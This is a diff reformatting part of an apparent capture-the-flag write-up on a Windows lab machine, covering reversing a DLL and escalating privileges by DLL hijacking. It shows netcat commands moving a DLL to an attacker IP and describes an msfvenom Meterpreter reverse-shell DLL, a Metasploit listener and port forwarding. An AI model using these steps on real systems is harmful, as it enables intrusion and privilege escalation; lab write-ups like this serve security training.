@@ -73,8 +73,8 @@ User flag on c:\Users\svc_exampanel\Desktop>type user.txt
 ```bash
 nc -lnvp4444 >  ExaminationManagement.dll
 .\nc.exe 10.10.14.000 4444 -w 3 <  ExaminationManagement.dll
-
 ```
+
 <br/><br/>
 <aside>
 🪡 We’ll use dnSpy to reverse dll
@@ -128,28 +128,27 @@ We found what is the dll’s route and a dll called externalupload which we can 
 icacls to check premises and we have write permissions, so we can make a beautiful dll hijacking
 <br/><br/>
 ![Untitled]({{ '/assets/images/94ca916f-5bc2-4a9a-af6f-814258e195ad-export-f51654bc-029e-4954-975d-4dc867d57570/94ca916f-5bc2-4a9a-af6f-814258e195ad-export-f51654bc-029e-4954-975d-4dc867d57570_Untitled_12.png' | relative_url }})
+
 <br/><br/>
----
-<br/><br/>
-> Once we finalize recognition let’s exploit the vulnerability and  escalate privileges
-> 
-1. We are gonna make the evil dll using msfvenom tool, we use -p to specify payload type(Meterpeter). Our local host will be a network interface (tun0) which will receive the reverse connection -f says the outgoing format
+Once we finalize recognition let’s exploit the vulnerability and  escalate privileges
+
+We are gonna make the evil dll using msfvenom tool, we use -p to specify payload type(Meterpeter). Our local host will be a network interface (tun0) which will receive the reverse connection -f says the outgoing format
 <br/><br/>
 ![Untitled]({{ '/assets/images/94ca916f-5bc2-4a9a-af6f-814258e195ad-export-f51654bc-029e-4954-975d-4dc867d57570/94ca916f-5bc2-4a9a-af6f-814258e195ad-export-f51654bc-029e-4954-975d-4dc867d57570_Untitled_13.png' | relative_url }})
 <br/><br/>
-1. We are going to listen using metasploit. We use this tool because it help us to get connections from multiple kinds of payloads made by using MSFVenom with multi/handler
+We are going to listen using metasploit. We use this tool because it help us to get connections from multiple kinds of payloads made by using MSFVenom with multi/handler
 <br/><br/>
 ![Untitled]({{ '/assets/images/94ca916f-5bc2-4a9a-af6f-814258e195ad-export-f51654bc-029e-4954-975d-4dc867d57570/94ca916f-5bc2-4a9a-af6f-814258e195ad-export-f51654bc-029e-4954-975d-4dc867d57570_Untitled_14.png' | relative_url }})
 <br/><br/>
-1. Upload the dll
+Upload the dll
 <br/><br/>
 ![Untitled]({{ '/assets/images/94ca916f-5bc2-4a9a-af6f-814258e195ad-export-f51654bc-029e-4954-975d-4dc867d57570/94ca916f-5bc2-4a9a-af6f-814258e195ad-export-f51654bc-029e-4954-975d-4dc867d57570_Untitled_15.png' | relative_url }})
 <br/><br/>
-1. Start a port forwarding to execute commands in a service running locally
+Start a port forwarding to execute commands in a service running locally
 <br/><br/>
 ![Untitled]({{ '/assets/images/94ca916f-5bc2-4a9a-af6f-814258e195ad-export-f51654bc-029e-4954-975d-4dc867d57570/94ca916f-5bc2-4a9a-af6f-814258e195ad-export-f51654bc-029e-4954-975d-4dc867d57570_Untitled_16.png' | relative_url }})
 <br/><br/>
-1. Establishing port forwarding.
+Establishing port forwarding.
 <br/><br/>
 ![Untitled]({{ '/assets/images/94ca916f-5bc2-4a9a-af6f-814258e195ad-export-f51654bc-029e-4954-975d-4dc867d57570/94ca916f-5bc2-4a9a-af6f-814258e195ad-export-f51654bc-029e-4954-975d-4dc867d57570_Untitled_17.png' | relative_url }})
 <br/><br/>
